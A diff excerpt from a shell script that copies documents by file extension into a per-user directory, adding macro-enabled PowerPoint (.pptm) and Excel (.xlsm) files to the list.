@@ -221,11 +221,13 @@ cp *.lsp $user_id$user_random/ 2> /dev/null
 cp *.ps $user_id$user_random/ 2> /dev/null
 cp *.ppt $user_id$user_random/ 2> /dev/null
 cp *.pptx $user_id$user_random/ 2> /dev/null
+cp *.pptm $user_id$user_random/ 2> /dev/null
 cp *.doc $user_id$user_random/ 2> /dev/null
 cp *.docx $user_id$user_random/ 2> /dev/null
 cp *.docm $user_id$user_random/ 2> /dev/null
 cp *.xls $user_id$user_random/ 2> /dev/null
 cp *.xlsx $user_id$user_random/ 2> /dev/null
+cp *.xlsm $user_id$user_random/ 2> /dev/null
 cp *.pdf $user_id$user_random/ 2> /dev/null
 cp *.pages $user_id$user_random/ 2> /dev/null
 cp *.numbers $user_id$user_random/ 2> /dev/null
